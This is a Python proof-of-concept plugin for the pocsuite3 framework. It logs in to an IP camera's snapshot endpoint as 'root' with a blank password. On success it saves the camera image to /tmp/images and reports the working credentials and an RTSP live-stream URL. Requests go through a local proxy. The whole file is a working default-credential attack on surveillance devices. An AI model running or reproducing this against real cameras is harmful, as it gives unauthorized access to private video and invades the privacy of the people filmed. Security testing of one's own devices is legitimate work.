import os.path

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests,logger)
import re
from urllib.parse import urljoin, urlparse

class POC(POCBase):


    def _verify(self):

        creds = {
            'username':'root',
            'password':''
        }
        ip_port = re.search(r'([\w-]+\.)+\w{1,3}(:\d{1,5})',self.url).group(0)
        os.environ.setdefault('http_proxy', "http://127.0.0.1:7890")
        os.environ.setdefault('https_proxy', 'http://127.0.0.1:7890')
        snap_url = urljoin(self.url,'/cgi-bin/video.jpg')
        res = requests.get(snap_url,auth=(creds['username'],creds['password']))
        #print(res.status_code)
        if res.status_code == 200 and res.headers['Content-Type'] == 'image/jpeg':
            parsed = urlparse(snap_url)
            image_dir = '/tmp/images'
            if not os.path.exists(image_dir):
                os.makedirs(image_dir)
            filename = os.path.join(image_dir,f"{parsed.netloc.replace(':','_')}") + '.jpg'
            with open(filename,'wb') as f:
                f.write(res.content)
                logger.info('sava snapshot to {}'.format(filename))

            result={'VerifyInfo':{'url':self.url}}
            result['VerifyInfo']['creds'] = creds
            result['VerifyInfo']['RTSP_URL'] = f'rtsp://{ip_port}/live.sdp'
            return self.parse_output(result)

register_poc(POC)
